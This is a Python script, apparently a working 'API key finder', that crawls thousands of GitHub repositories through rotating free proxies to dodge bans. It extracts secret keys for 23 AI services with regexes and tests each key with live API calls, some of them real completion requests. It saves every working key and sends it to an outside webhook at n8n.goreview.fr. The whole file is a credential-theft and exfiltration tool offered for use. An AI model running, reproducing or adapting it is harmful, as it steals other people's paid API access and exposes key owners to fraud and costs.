import requests
import random
import string
import zipfile
import io
from bs4 import BeautifulSoup
import time
import re
from multiprocessing import Pool, Manager, Value, Lock
from threading import Lock as ThreadLock
import queue

# Configuration
PARALLEL_WORKERS = 50  # Number of parallel worker processes
PROXY_TIMEOUT = 10  # Timeout for proxy requests
REPOS_PER_IP = 50  # Rotate IP after this many repos

# Shared state for multiprocessing
manager = None
shared_repos_searched = None
shared_keys_found = None
shared_lock = None

# Proxy rotation system
PROXY_LIST = []
FREE_PROXY_LIST = []
CURRENT_FREE_PROXY = None
PROXY_ROTATION_INTERVAL = 50

# Load proxies from file if it exists
def load_proxies_from_file(filename="proxies.txt"):
    """Load proxies from a text file (one per line)."""
    global PROXY_LIST
    try:
        with open(filename, "r") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        return len(PROXY_LIST)
    except FileNotFoundError:
        return 0

def fetch_free_proxies():
    """Fetch free proxies from online sources."""
    global FREE_PROXY_LIST, CURRENT_FREE_PROXY
    proxies = []
    
    if FREE_PROXY_LIST:
        return True
    
    try:
        proxy_sources = [
            {
                "name": "proxyscrape.com",
                "url": "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
            },
            {
                "name": "proxyscrape.com (socks4)",
                "url": "https://api.proxyscrape.com/v2/?request=get&protocol=socks4&timeout=10000&country=all"
            },
            {
                "name": "proxyscrape.com (socks5)",
                "url": "https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=10000&country=all"
            }
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source["url"], timeout=5)
                if response.status_code == 200 and response.text.strip():
                    proxy_lines = response.text.strip().split('\n')
                    for line in proxy_lines:
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            if 'socks4' in source["name"]:
                                proxies.append(f"socks4://{line}")
                            elif 'socks5' in source["name"]:
                                proxies.append(f"socks5://{line}")
                            else:
                                proxies.append(f"http://{line}")
                    if proxies:
                        print(f"[PROXY] Fetched {len(proxies)} proxies from {source['name']}")
                        break
            except Exception as e:
                continue
        
        if not proxies:
            try:
                response = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
                if response.status_code == 200:
                    import csv
                    import io
                    csv_data = csv.reader(io.StringIO(response.text))
                    for row in csv_data:
                        if len(row) >= 2:
                            ip, port = row[0], row[1]
                            if ip and port:
                                proxies.append(f"http://{ip}:{port}")
                    if proxies:
                        print(f"[PROXY] Fetched {len(proxies)} proxies from proxy-list.download")
            except:
                pass
        
    except Exception as e:
        pass
    
    if proxies:
        FREE_PROXY_LIST = proxies
        CURRENT_FREE_PROXY = random.choice(FREE_PROXY_LIST)
        return True
    else:
        if not hasattr(fetch_free_proxies, '_warned'):
            print("[PROXY] No free proxies available, using direct connection")
            fetch_free_proxies._warned = True
        return False

def get_next_proxy():
    """Get next proxy for IP rotation."""
    global CURRENT_FREE_PROXY, FREE_PROXY_LIST
    if not FREE_PROXY_LIST:
        fetch_free_proxies()
    if FREE_PROXY_LIST:
        CURRENT_FREE_PROXY = random.choice(FREE_PROXY_LIST)
        return CURRENT_FREE_PROXY
    return None

def check_github_access(proxy=None):
    """Check if GitHub is accessible (returns 200) - detects bans."""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        response = requests.get(
            "https://github.com",
            headers=headers,
            proxies=proxies,
            timeout=PROXY_TIMEOUT
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"[WARNING] GitHub returned status {response.status_code} - possible ban")
            return False
    except Exception as e:
        return False

# AI Company API key patterns only (text, image, video, audio generation)
# Note: Validation is handled by validate_key_wrapper() for multiprocessing compatibility
API_KEY_PATTERNS = {
    "OpenAI": {"pattern": r'\bsk-[a-zA-Z0-9]{32,}\b'},
    "Anthropic": {"pattern": r'\bsk-ant-[a-zA-Z0-9-]{95,}\b'},
    "Cohere": {"pattern": r'\bco_[a-zA-Z0-9]{40}\b'},
    "Hugging Face": {"pattern": r'\bhf_[a-zA-Z0-9]{37}\b'},
    "Perplexity AI": {"pattern": r'\bpplx-[a-zA-Z0-9]{32,}\b'},
    "Together AI": {"pattern": r'\b[a-f0-9]{64}\b'},
    "Groq": {"pattern": r'\bgsk_[a-zA-Z0-9]{32,}\b'},
    "Mistral AI": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "AI21 Labs": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Stability AI": {"pattern": r'\bsk-[a-zA-Z0-9]{48,}\b'},
    "Replicate": {"pattern": r'\br8_[a-zA-Z0-9]{37,}\b'},
    "Leonardo AI": {"pattern": r'\b[a-f0-9]{32}\b'},
    "Runway ML": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Pika Labs": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "ElevenLabs": {"pattern": r'\b[a-f0-9]{32}\b'},
    "Deepgram": {"pattern": r'\b[a-f0-9]{32}\b'},
    "AssemblyAI": {"pattern": r'\b[a-f0-9]{32}\b'},
    "Google Gemini": {"pattern": r'\bAIza[0-9A-Za-z_-]{35}\b'},
    "Google Vertex AI": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Aleph Alpha": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Character.AI": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Jasper AI": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'},
    "Copy.ai": {"pattern": r'\b[A-Za-z0-9]{40,64}\b'}
}

# Validation functions - Check actual API success responses, not just status codes
def validate_openai_key(key):
    """Validate OpenAI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.openai.com/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data (success response structure)
            return isinstance(data, dict) and "data" in data and isinstance(data["data"], list) and len(data["data"]) > 0
        elif response.status_code == 429:
            # Rate limited but key is valid
            return True
        return False
    except:
        return False

def validate_anthropic_key(key):
    """Validate Anthropic API key - verify actual success response from API."""
    try:
        headers = {"x-api-key": key, "anthropic-version": "2023-06-01", "Content-Type": "application/json"}
        response = requests.post("https://api.anthropic.com/v1/messages", headers=headers,
            json={"model": "claude-3-haiku-20240307", "max_tokens": 10, "messages": [{"role": "user", "content": "hi"}]}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual message response (success structure)
            return isinstance(data, dict) and "content" in data
        elif response.status_code == 400:
            # Bad request but key is valid (might be invalid model or params)
            data = response.json()
            return isinstance(data, dict) and "error" in data and "type" in data.get("error", {})
        return False
    except:
        return False

def validate_cohere_key(key):
    """Validate Cohere API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.cohere.ai/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "models" in data
        return False
    except:
        return False

def validate_huggingface_key(key):
    """Validate Hugging Face API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}"}
        response = requests.get("https://huggingface.co/api/whoami", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("name" in data or "username" in data or "id" in data)
        return False
    except:
        return False

def validate_perplexity_key(key):
    """Validate Perplexity AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.post("https://api.perplexity.ai/chat/completions", headers=headers,
            json={"model": "llama-3.1-sonar-small-128k-online", "messages": [{"role": "user", "content": "hi"}]}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual completion response
            return isinstance(data, dict) and "choices" in data
        elif response.status_code == 400:
            # Bad request but key is valid
            data = response.json()
            return isinstance(data, dict) and "error" in data
        return False
    except:
        return False

def validate_togetherai_key(key):
    """Validate Together AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.together.xyz/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "data" in data and isinstance(data["data"], list)
        return False
    except:
        return False

def validate_groq_key(key):
    """Validate Groq API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.groq.com/openai/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "data" in data and isinstance(data["data"], list)
        return False
    except:
        return False

def validate_mistral_key(key):
    """Validate Mistral AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.mistral.ai/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "data" in data and isinstance(data["data"], list)
        return False
    except:
        return False

def validate_ai21_key(key):
    """Validate AI21 Labs API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.ai21.com/studio/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, (dict, list)) and len(data) > 0
        return False
    except:
        return False

def validate_stabilityai_key(key):
    """Validate Stability AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.stability.ai/v1/user/account", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual account data
            return isinstance(data, dict) and ("id" in data or "email" in data or "username" in data)
        return False
    except:
        return False

def validate_replicate_key(key):
    """Validate Replicate API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Token {key}"}
        response = requests.get("https://api.replicate.com/v1/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "results" in data
        return False
    except:
        return False

def validate_leonardo_key(key):
    """Validate Leonardo AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://cloud.leonardo.ai/api/rest/v1/me", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("id" in data or "username" in data or "email" in data)
        return False
    except:
        return False

def validate_runway_key(key):
    """Validate Runway ML API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.runwayml.com/v1/account", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual account data
            return isinstance(data, dict) and ("id" in data or "email" in data or "username" in data)
        return False
    except:
        return False

def validate_pika_key(key):
    """Validate Pika Labs API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.pika.art/v1/user", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("id" in data or "username" in data or "email" in data)
        return False
    except:
        return False

def validate_elevenlabs_key(key):
    """Validate ElevenLabs API key - verify actual success response from API."""
    try:
        headers = {"xi-api-key": key}
        response = requests.get("https://api.elevenlabs.io/v1/user", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("subscription" in data or "user_id" in data or "id" in data)
        return False
    except:
        return False

def validate_deepgram_key(key):
    """Validate Deepgram API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Token {key}"}
        response = requests.get("https://api.deepgram.com/v1/projects", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual projects data
            return isinstance(data, dict) and "projects" in data
        return False
    except:
        return False

def validate_assemblyai_key(key):
    """Validate AssemblyAI API key - verify actual success response from API."""
    try:
        headers = {"authorization": key}
        response = requests.get("https://api.assemblyai.com/v2/transcript", headers=headers, timeout=10)
        if response.status_code == 200:
            # Valid endpoint response
            return True
        elif response.status_code == 400:
            # Bad request but key is valid (might need transcript ID)
            data = response.json()
            return isinstance(data, dict) and "error" in data
        return False
    except:
        return False

def validate_gemini_key(key):
    """Validate Google Gemini API key - verify actual success response from API."""
    try:
        params = {"key": key}
        response = requests.get("https://generativelanguage.googleapis.com/v1/models", params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, dict) and "models" in data
        return False
    except:
        return False

def validate_vertexai_key(key):
    return len(key) >= 32

def validate_alephalpha_key(key):
    """Validate Aleph Alpha API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.aleph-alpha.com/models", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual models data
            return isinstance(data, (dict, list)) and len(data) > 0
        return False
    except:
        return False

def validate_characterai_key(key):
    """Validate Character.AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://beta.character.ai/api/user", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("user" in data or "id" in data or "username" in data)
        return False
    except:
        return False

def validate_jasper_key(key):
    """Validate Jasper AI API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.jasper.ai/v1/user", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("id" in data or "email" in data or "username" in data)
        return False
    except:
        return False

def validate_copyai_key(key):
    """Validate Copy.ai API key - verify actual success response from API."""
    try:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        response = requests.get("https://api.copy.ai/v1/user", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Verify we got actual user data
            return isinstance(data, dict) and ("id" in data or "email" in data or "username" in data)
        return False
    except:
        return False

def find_api_keys_in_content(content):
    """Search for all API key patterns in content and return matches with service names."""
    found_keys = []
    for service_name, config in API_KEY_PATTERNS.items():
        pattern = config["pattern"]
        matches = re.finditer(pattern, content)
        for match in matches:
            key = match.group(0)
            found_keys.append({
                "service": service_name,
                "key": key,
                "position": match.start()
            })
    return found_keys

def fetch_repo_list_large(count=10000, proxy=None):
    """
    Fetch a large list of repo URLs from GitHub (10,000 repos).
    Only fetches the latest/updated repos (sorted by updated date).
    """
    repos = []
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    print(f"[FETCH] Fetching {count} repo URLs (latest/updated repos)...")
    print(f"[FETCH] This may take a few minutes...")
    
    # Use multiple search queries to get diverse repos
    search_chars = string.ascii_lowercase + string.digits
    pages_per_char = 10  # Pages per character
    
    for char in search_chars:
        if len(repos) >= count:
            break
        
        for page in range(1, pages_per_char + 1):
            if len(repos) >= count:
                break
            
            # Search for repos with 0 stars, sorted by updated (latest first)
            search_url = f"https://github.com/search?q={char}+stars%3A0&type=repositories&s=updated&o=desc&p={page}"
            
            try:
                response = requests.get(search_url, headers=headers, proxies=proxies, timeout=PROXY_TIMEOUT)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    for a in soup.find_all('a', href=True):
                        href = a['href']
                        if href.startswith("/") and href.count("/") == 2 and "topics" not in href and "search" not in href:
                            full_url = "https://github.com" + href
                            if full_url not in repos:
                                repos.append(full_url)
                                if len(repos) % 100 == 0:
                                    print(f"[FETCH] Progress: {len(repos)}/{count} repos fetched...")
                                if len(repos) >= count:
                                    break
                elif response.status_code == 429:
                    # Rate limited - wait a bit
                    time.sleep(2)
            except Exception as e:
                continue
        
        # Small delay between characters to avoid rate limits
        if len(repos) < count:
            time.sleep(0.5)
    
    print(f"[FETCH] Completed: Fetched {len(repos)} repo URLs")
    return repos[:count]  # Return exactly the requested count

def process_single_repo_fast(repo_url, proxy=None, validate_func=None):
    """
    Fast worker function: Process 1 repo at a time, optimized for speed.
    Returns immediately when API key is found.
    """
    zip_url = f"{repo_url}/archive/HEAD.zip"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    try:
        r = requests.get(zip_url, stream=True, proxies=proxies, timeout=8)
        if r.status_code == 404:
            return None
        
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            files_processed = 0
            max_files = 30  # Reduced for speed
            
            for filename in z.namelist():
                # Quick skip checks
                skip_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', 
                                 '.exe', '.pdf', '.zip', '.tar', '.gz', '.mp4', 
                                 '.mp3', '.wav', '.woff', '.woff2', '.ttf', '.eot']
                if any(filename.lower().endswith(ext) for ext in skip_extensions):
                    continue
                
                if any(skip_dir in filename for skip_dir in ['node_modules/', '.git/', 'vendor/', '__pycache__/']):
                    continue
                
                if filename.endswith('.ipynb'):
                    continue
                
                if files_processed >= max_files:
                    break
                
                try:
                    file_info = z.getinfo(filename)
                    if file_info.file_size > 500000:  # Skip files > 500KB
                        continue
                    
                    with z.open(filename) as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        
                        found_keys = find_api_keys_in_content(content)
                        if len(found_keys) > 50:  # Skip files with too many matches
                            continue
                        
                        if found_keys:
                            files_processed += 1
                            # Test only first key for speed
                            key_info = found_keys[0]
                            service = key_info["service"]
                            key = key_info["key"]
                            
                            # Validate the key using provided function
                            if validate_func and validate_func(service, key):
                                # KEY FOUND! Return immediately
                                return {
                                    "service": service,
                                    "key": key,
                                    "repo_url": repo_url,
                                    "filename": filename,
                                    "position": key_info['position']
                                }
                except:
                    continue
        
        return None
    except:
        return None

def validate_key_wrapper(service, key):
    """Wrapper to call validation function by service name."""
    validation_funcs = {
        "OpenAI": validate_openai_key,
        "Anthropic": validate_anthropic_key,
        "Cohere": validate_cohere_key,
        "Hugging Face": validate_huggingface_key,
        "Perplexity AI": validate_perplexity_key,
        "Together AI": validate_togetherai_key,
        "Groq": validate_groq_key,
        "Mistral AI": validate_mistral_key,
        "AI21 Labs": validate_ai21_key,
        "Stability AI": validate_stabilityai_key,
        "Replicate": validate_replicate_key,
        "Leonardo AI": validate_leonardo_key,
        "Runway ML": validate_runway_key,
        "Pika Labs": validate_pika_key,
        "ElevenLabs": validate_elevenlabs_key,
        "Deepgram": validate_deepgram_key,
        "AssemblyAI": validate_assemblyai_key,
        "Google Gemini": validate_gemini_key,
        "Google Vertex AI": validate_vertexai_key,
        "Aleph Alpha": validate_alephalpha_key,
        "Character.AI": validate_characterai_key,
        "Jasper AI": validate_jasper_key,
        "Copy.ai": validate_copyai_key
    }
    
    func = validation_funcs.get(service)
    if not func:
        return False
    
    # Apply pattern-specific checks
    if service == "OpenAI" and not key.startswith('sk-'):
        return False
    elif service == "Anthropic" and not key.startswith('sk-ant-'):
        return False
    elif service == "Cohere" and (not key.startswith('co_') or len(key) != 43):
        return False
    elif service == "Hugging Face" and (not key.startswith('hf_') or len(key) != 40):
        return False
    elif service == "Perplexity AI" and not key.startswith('pplx-'):
        return False
    elif service == "Together AI" and len(key) != 64:
        return False
    elif service == "Groq" and not key.startswith('gsk_'):
        return False
    elif service in ["Mistral AI", "AI21 Labs", "Runway ML", "Pika Labs", "Google Vertex AI", 
                     "Aleph Alpha", "Character.AI", "Jasper AI", "Copy.ai"]:
        if not (40 <= len(key) <= 64) or any(c in key for c in ['-', '_', '.']):
            return False
    elif service == "Stability AI" and not key.startswith('sk-'):
        return False
    elif service == "Replicate" and not key.startswith('r8_'):
        return False
    elif service in ["Leonardo AI", "ElevenLabs", "Deepgram", "AssemblyAI"] and len(key) != 32:
        return False
    elif service == "Google Gemini" and (not key.startswith('AIza') or len(key) != 39):
        return False
    
    return func(key)

def worker_process(repo_url, proxy, worker_stats):
    """Worker process wrapper - processes 1 repo and updates stats."""
    result = process_single_repo_fast(repo_url, proxy, validate_key_wrapper)
    
    with worker_stats['lock']:
        worker_stats['repos_searched'].value += 1
        current_count = worker_stats['repos_searched'].value
    
    if result:
        with worker_stats['lock']:
            worker_stats['keys_found'].value += 1
        
        # Output immediately when key is found
        print(f"\n{'='*60}")
        print(f"[✓ KEY FOUND] Repo #{current_count}")
        print(f"{'='*60}")
        print(f"Service: {result['service']}")
        print(f"Key: {result['key']}")
        print(f"Repo: {result['repo_url']}")
        print(f"File: {result['filename']}")
        print(f"{'='*60}\n")
        
        # Save to file
        save_found_key(result['service'], result['key'], result['repo_url'], 
                      result['filename'], "API request successful")
    
    return result

def save_found_key(service, key, repo_url, filename, response_details=None):
    """Save found valid API key to working_api_keys.txt."""
    try:
        with open("working_api_keys.txt", "a") as f:
            f.write(f"{'='*60}\n")
            f.write(f"Service: {service}\n")
            f.write(f"API Key: {key}\n")
            f.write(f"Repository: {repo_url}\n")
            f.write(f"File: {filename}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            if response_details:
                f.write(f"Validation Response: {response_details}\n")
            f.write(f"Status: VALIDATED - API request successful\n")
            f.write(f"{'='*60}\n\n")
        
        # Send webhook
        send_webhook_notification(service, key, repo_url, filename, response_details)
    except Exception as e:
        print(f"Warning: Could not save to file: {e}")

def send_webhook_notification(service, key, repo_url, filename, response_details=None):
    """Send working API key to webhook."""
    webhook_url = "https://n8n.goreview.fr/webhook/workingkey"
    try:
        ai_text_services = ["OpenAI", "Anthropic", "Cohere", "Hugging Face", "Perplexity AI", 
                           "Together AI", "Groq", "Mistral AI", "AI21 Labs", "Google Gemini", 
                           "Google Vertex AI", "Aleph Alpha", "Character.AI", "Jasper AI", "Copy.ai"]
        ai_image_services = ["Stability AI", "Replicate", "Leonardo AI"]
        ai_video_services = ["Runway ML", "Pika Labs"]
        ai_audio_services = ["ElevenLabs", "Deepgram", "AssemblyAI"]
        
        service_category = "Other"
        if service in ai_text_services:
            service_category = "AI Text Generation"
        elif service in ai_image_services:
            service_category = "AI Image Generation"
        elif service in ai_video_services:
            service_category = "AI Video Generation"
        elif service in ai_audio_services:
            service_category = "AI Speech/Audio"
        
        payload = {
            "service": service,
            "service_category": service_category,
            "api_key": key,
            "key_preview": key[:20] + "..." if len(key) > 20 else key,
            "key_length": len(key),
            "repository": repo_url,
            "file": filename,
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "status": "VALIDATED - API request successful",
            "validation_response": response_details or "API request successful - key validated",
            "found_in": {
                "repository": repo_url,
                "file": filename,
                "source": "GitHub",
                "repository_url": repo_url
            },
            "metadata": {
                "validated": True,
                "validation_method": "API Request",
                "key_type": "Working API Key"
            }
        }
        
        response = requests.post(webhook_url, json=payload, 
                               headers={"Content-Type": "application/json"}, timeout=10)
        if response.status_code in [200, 201, 204]:
            print(f"✓ Webhook sent to {webhook_url}")
    except:
        pass

# --- MAIN ORCHESTRATOR ---
if __name__ == "__main__":
    print("="*60)
    print("API KEY FINDER - Parallel Fast Scanner")
    print("="*60)
    print(f"Searching for API keys from {len(API_KEY_PATTERNS)} AI services")
    print(f"PARALLEL WORKERS: {PARALLEL_WORKERS} processes")
    print(f"IP ROTATION: Every {REPOS_PER_IP} repos")
    print(f"Only validated working keys (verified API success responses) will be saved")
    print("="*60)
    print()
    
    # Initialize proxy system
    load_proxies_from_file()
    print("[INIT] Fetching free proxies...")
    fetch_free_proxies()
    
    # Initialize shared state for multiprocessing
    manager = Manager()
    shared_repos_searched = manager.Value('i', 0)
    shared_keys_found = manager.Value('i', 0)
    shared_lock = manager.Lock()
    
    worker_stats = {
        'repos_searched': shared_repos_searched,
        'keys_found': shared_keys_found,
        'lock': shared_lock
    }
    
    # Check initial GitHub access
    print("[INIT] Checking GitHub access...")
    current_proxy = get_next_proxy()
    if not check_github_access(current_proxy):
        print("[WARNING] Proxy failed, trying direct connection...")
        if not check_github_access(None):
            print("[ERROR] Cannot access GitHub. Exiting.")
            exit(1)
    print("[INIT] GitHub access confirmed (200 OK)\n")
    
    # STEP 1: Fetch 10,000 repo URLs upfront
    print("="*60)
    print("STEP 1: Fetching 10,000 repo URLs (latest/updated repos)")
    print("="*60)
    repo_pool = fetch_repo_list_large(10000, current_proxy)
    
    if len(repo_pool) < 50:
        print(f"[ERROR] Only fetched {len(repo_pool)} repos. Need at least 50. Exiting.")
        exit(1)
    
    print(f"[SUCCESS] Fetched {len(repo_pool)} repo URLs")
    print(f"[INFO] Will process in batches of {REPOS_PER_IP} repos with IP rotation\n")
    
    # STEP 2: Process repos in batches of 50, rotating IP after each batch
    batch_number = 0
    repo_index = 0
    
    try:
        while repo_index < len(repo_pool):
            batch_number += 1
            
            # Get next batch of 50 repos
            batch_repos = repo_pool[repo_index:repo_index + REPOS_PER_IP]
            if not batch_repos:
                break
            
            # Rotate IP for this batch
            print(f"\n{'='*60}")
            print(f"BATCH #{batch_number} - Processing {len(batch_repos)} repos")
            print(f"{'='*60}")
            current_proxy = get_next_proxy()
            print(f"[IP] Rotated to new proxy: {current_proxy[:50] if current_proxy else 'Direct connection'}...")
            
            # Check GitHub access with new IP
            if not check_github_access(current_proxy):
                print("[WARNING] New IP failed, trying direct connection...")
                current_proxy = None
                if not check_github_access(None):
                    print("[WARNING] Possible ban. Waiting 30 seconds...")
                    time.sleep(30)
                    continue
            
            print(f"[CRAWL] Starting to crawl {len(batch_repos)} repos...")
            
            # Process repos in parallel
            start_time = time.time()
            with Pool(processes=PARALLEL_WORKERS) as pool:
                # Create tasks: each worker processes 1 repo
                tasks = [(repo_url, current_proxy, worker_stats) for repo_url in batch_repos]
                
                # Process in parallel (each worker handles 1 repo)
                results = pool.starmap(worker_process, tasks)
                
                # Count successful results
                keys_found_in_batch = sum(1 for r in results if r is not None)
            
            elapsed = time.time() - start_time
            with shared_lock:
                total_repos = shared_repos_searched.value
                total_keys = shared_keys_found.value
            
            print(f"\n[STATUS] Batch #{batch_number} completed in {elapsed:.1f}s")
            print(f"  Repos crawled: {len(batch_repos)}")
            print(f"  Keys found this batch: {keys_found_in_batch}")
            print(f"  Total repos searched: {total_repos}")
            print(f"  Total keys found: {total_keys}")
            print(f"  Remaining repos in pool: {len(repo_pool) - repo_index - len(batch_repos)}")
            
            # Move to next batch
            repo_index += len(batch_repos)
            
            # If we've processed all repos, we're done
            if repo_index >= len(repo_pool):
                print(f"\n[COMPLETE] Processed all {len(repo_pool)} repos from the pool")
                break
            
            # Brief pause before next batch
            print(f"\n[IP ROTATION] Rotating to new IP for next batch...\n")
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n\n[INTERRUPTED] Stopping...")
        with shared_lock:
            final_repos = shared_repos_searched.value
            final_keys = shared_keys_found.value
        print(f"[FINAL] Searched {final_repos} repositories. Found {final_keys} valid API key(s).")
        print(f"[FINAL] Remaining repos in pool: {len(repo_pool) - repo_index}")
